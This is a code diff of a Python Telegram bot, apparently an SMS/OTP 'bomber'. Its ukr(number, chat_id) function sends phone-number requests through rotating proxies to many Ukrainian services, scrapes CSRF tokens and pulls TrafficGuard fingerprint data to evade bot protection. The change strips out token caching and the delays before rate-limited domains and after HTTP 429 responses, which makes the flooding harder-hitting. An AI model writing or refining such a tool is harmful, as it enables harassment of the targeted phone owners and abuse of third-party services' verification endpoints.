@@ -125,10 +125,6 @@ proxies_failed = {}  # key -> count (неуспішні запити)
 
 last_status_msg = {}  # chat_id -> message_id
 
-# Кеш для CSRF токенів (домен -> токен, час створення)
-csrf_cache = {}  # domain -> {"token": "...", "timestamp": float}
-csrf_cache_ttl = 300  # TTL в секундах (5 хвилин)
-
 storage = MemoryStorage()
 bot = Bot(token=config.token)
 dp = Dispatcher(bot, storage=storage)
@@ -528,16 +524,7 @@ async def get_trafficguard_fingerprint(proxy_url=None, proxy_auth=None):
         logging.warning(f"Помилка отримання fingerprinting для TrafficGuard: {e}")
         return None
 
-async def get_csrf_token(url, headers=None, use_cache=True):
-    domain = url.split('/')[2] if '/' in url else url
-    
-    # Перевіряємо кеш
-    if use_cache and domain in csrf_cache:
-        cached = csrf_cache[domain]
-        if asyncio.get_event_loop().time() - cached["timestamp"] < csrf_cache_ttl:
-            return cached["token"]
-    
-    # Отримуємо новий токен
+async def get_csrf_token(url, headers=None):
     async with aiohttp.ClientSession() as session:
         async with session.get(url, headers=headers) as response:
             html = await response.text()
@@ -545,19 +532,17 @@ async def get_csrf_token(url, headers=None, use_cache=True):
 
             csrf_token = soup.find("input", {"name": "_csrf"})
             if csrf_token:
-                token = csrf_token.get("value")
-            elif soup.find("input", {"name": "csrfmiddlewaretoken"}):
-                token = soup.find("input", {"name": "csrfmiddlewaretoken"}).get("value")
-            elif soup.find("meta", {"name": "csrf-token"}):
-                token = soup.find("meta", {"name": "csrf-token"}).get("content")
-            else:
-                raise ValueError("CSRF-токен не знайдено.")
+                return csrf_token.get("value")
             
-            # Зберігаємо в кеш
-            if use_cache:
-                csrf_cache[domain] = {"token": token, "timestamp": asyncio.get_event_loop().time()}
+            csrf_middleware_token = soup.find("input", {"name": "csrfmiddlewaretoken"})
+            if csrf_middleware_token:
+                return csrf_middleware_token.get("value")
             
-            return token
+            meta_token = soup.find("meta", {"name": "csrf-token"})
+            if meta_token:
+                return meta_token.get("content")
+            
+            raise ValueError("CSRF-токен не знайдено.")
 
 def get_cancel_keyboard():
     keyboard = InlineKeyboardMarkup(row_width=1)
@@ -1979,13 +1964,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
     trafficguard_timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
     trafficguard_timestamp_u = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
     
-    # Отримуємо fingerprinting дані (якщо можливо і Playwright доступний)
-    fingerprint_data = None
-    if PLAYWRIGHT_AVAILABLE:
-        try:
-            fingerprint_data = await get_trafficguard_fingerprint(proxy_url=proxy_url, proxy_auth=proxy_auth)
-        except Exception:
-            pass  # Ігноруємо помилки, використовуємо базові значення
+    # Отримуємо fingerprinting дані (якщо можливо)
+    fingerprint_data = await get_trafficguard_fingerprint(proxy_url=proxy_url, proxy_auth=proxy_auth)
     
     # Генеруємо динамічні base64 encoded дані
     current_timestamp = int(datetime.utcnow().timestamp() * 1000)
@@ -2073,14 +2053,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
             if not attack_flags.get(chat_id):
                 return
             
-            timeout = aiohttp.ClientTimeout(total=3)  # Зменшено до 3 секунд для швидших помилок
+            timeout = aiohttp.ClientTimeout(total=5)
             domain = url.split('/')[2] if '/' in url else url
-            
-            # Додаємо затримку для сервісів з rate limit перед запитом
-            rate_limit_domains = ['helsi.me', 'pizza-time.eatery.club', 'iq-pizza.eatery.club', 
-                                 'bars.itbi.com.ua', 'www.work.ua', 'api.pizzaday.ua']
-            if domain in rate_limit_domains:
-                await asyncio.sleep(0.5)  # Затримка 0.5 сек перед rate-limited сервісами
             
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 method = kwargs.pop('method', 'POST')
@@ -2097,10 +2071,6 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
                     request_success = response.status in [200, 201, 202]
                     # Завжди виводимо статус в цифрах, навіть якщо це помилка
                     logging.info(f"{domain} | {response.status} | {elapsed_time:.2f}s")
-                    
-                    # Додаємо затримку після rate limit помилок
-                    if response.status == 429:
-                        await asyncio.sleep(1.0)  # Додаткова затримка після 429
                         
         except asyncio.TimeoutError:
             request_success = False
